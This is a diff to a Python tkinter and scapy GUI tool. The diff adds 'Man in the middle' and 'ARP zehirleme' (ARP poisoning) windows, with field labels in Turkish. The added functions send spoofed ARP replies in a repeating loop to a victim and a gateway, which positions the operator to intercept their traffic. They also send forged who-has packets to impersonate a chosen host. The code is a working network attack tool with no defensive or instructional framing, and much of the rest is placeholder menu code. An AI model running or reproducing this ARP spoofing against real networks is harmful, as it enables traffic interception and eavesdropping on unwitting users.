@@ -1,9 +1,125 @@
 #author _ibrahimakdag_
+import sys
 import tkinter as tk
 from tkinter.ttk import *
 from scapy.all import *
+import os
+import time
+
 root = tk.Tk()
-root.geometry("800x600+300+100")
+root.geometry("600x400+300+100")
+running = True
+def mitma():
+    mitmSaldirisi = tk.Toplevel()
+    mitmSaldirisi.geometry("300x200+300+100")
+    label = Label(mitmSaldirisi,text="Hedef host(Kurban)")
+    label.grid(row=0,sticky=tk.W)
+    kurbanIP = tk.Text(mitmSaldirisi, width=15, height=1)
+    kurbanIP.insert(tk.INSERT, "0.0.0.0")
+    kurbanIP.grid(row=0, column=1)
+	
+    label = Label(mitmSaldirisi,text="Hedef MAC")
+    label.grid(row=1,sticky=tk.W)
+    kurbanMAC = tk.Text(mitmSaldirisi, width=17, height=1)
+    kurbanMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
+    kurbanMAC.grid(row=1, column=1)
+	
+    label = Label(mitmSaldirisi,text="Gateway IP")
+    label.grid(row=2,sticky=tk.W)
+    routerIP = tk.Text(mitmSaldirisi, width=15, height=1)
+    routerIP.insert(tk.INSERT, "0.0.0.0")
+    routerIP.grid(row=2, column=1)
+    
+    label = Label(mitmSaldirisi,text="Gateway MAC")
+    label.grid(row=3,sticky=tk.W)
+    routerMAC = tk.Text(mitmSaldirisi, width=17, height=1)
+    routerMAC.insert(tk.INSERT, "ff:ff:ff:ff:ff:ff")
+    routerMAC.grid(row=3, column=1)
+    
+    def gonder():
+        gateIP = routerIP.get(1.0, 1.15)
+        victimIP = kurbanIP.get(1.0, 1.15)
+        victimMAC = kurbanMAC.get(1.0, 1.17)
+        gateMAC = routerMAC.get(1.0, 1.17)
+        if running==True:
+            send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= victimMAC))
+            send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gateMAC))
+            time.sleep(1.5)
+        root.after(1000, gonder)
+        if running==False:
+            send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+            send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+            
+            
+    def start():
+        global running
+        running = True
+        gonder()
+    def stop():
+        global running
+        running = False
+        gonder()
+    butonGonder = tk.Button(mitmSaldirisi, text='Gönder', command=start).grid(row=4, sticky=tk.W)
+    butonStop = tk.Button(mitmSaldirisi, text='Stop', command=stop).grid(row=4, column=1)
+
+def donothing():
+    ikinci = tk.Toplevel()
+    l = tk.Label(ikinci, text="This is child")
+    l.pack(side="top", fill="both", expand=True, padx=100, pady=100)
+
+def ARPpoisoning():
+    arpzehri = tk.Toplevel()
+    arpzehri.geometry("300x200+300+100")
+    label = Label(arpzehri,text="Hedef host(Kurban)")
+    label.grid(row=0,sticky=tk.W)
+    kurban = tk.Text(arpzehri, width=15, height=1)
+    kurban.insert(tk.INSERT, "0.0.0.0")
+    kurban.grid(row=0, column=1)
+	
+    label = Label(arpzehri,text="Taklit edilecek host")
+    label.grid(row=1,sticky=tk.W)
+    taklit = tk.Text(arpzehri, width=15, height=1)
+    taklit.insert(tk.INSERT, "0.0.0.0")
+    taklit.grid(row=1, column=1)
+    def gonder():
+    
+        paket = Ether()/ARP(op="who-has",psrc=taklit.get(1.0, 1.15),pdst=kurban.get(1.0, 1.15))
+ 
+        sendp(paket)
+    butonGonder = tk.Button(arpzehri, text='Gönder', command=gonder).grid(row=2, sticky=tk.W)
+
+menubar = tk.Menu(root)
+filemenu = tk.Menu(menubar, tearoff=0)
+filemenu.add_command(label="Man in the middle", command=mitma)
+filemenu.add_command(label="ARP zehirleme", command=ARPpoisoning)
+filemenu.add_command(label="Save", command=donothing)
+filemenu.add_command(label="Save as...", command=donothing)
+filemenu.add_command(label="Close", command=root.destroy)
+
+filemenu.add_separator()
+
+filemenu.add_command(label="Exit", command=root.quit)
+menubar.add_cascade(label="File", menu=filemenu)
+editmenu = tk.Menu(menubar, tearoff=0)
+editmenu.add_command(label="Undo", command=donothing)
+
+editmenu.add_separator()
+
+editmenu.add_command(label="Cut", command=donothing)
+editmenu.add_command(label="Copy", command=donothing)
+editmenu.add_command(label="Paste", command=donothing)
+editmenu.add_command(label="Delete", command=donothing)
+editmenu.add_command(label="Select All", command=donothing)
+
+menubar.add_cascade(label="Edit", menu=editmenu)
+helpmenu = tk.Menu(menubar, tearoff=0)
+helpmenu.add_command(label="Help Index", command=donothing)
+helpmenu.add_command(label="About...", command=donothing)
+menubar.add_cascade(label="Help", menu=helpmenu)
+
+root.config(menu=menubar)
+
+
 
 note = Notebook(root)
 
@@ -599,6 +715,7 @@ def sel():
     var2.set(0)
     var3.set(0)
 
+Separator(root, orient='horizontal').grid(column=0, row=0, columnspan=4, sticky=tk.W)
 R12 = Radiobutton(root, text="Ethernet", variable=var3, value=5, command=sel)
 R12.grid(row=1, sticky=tk.W)
 
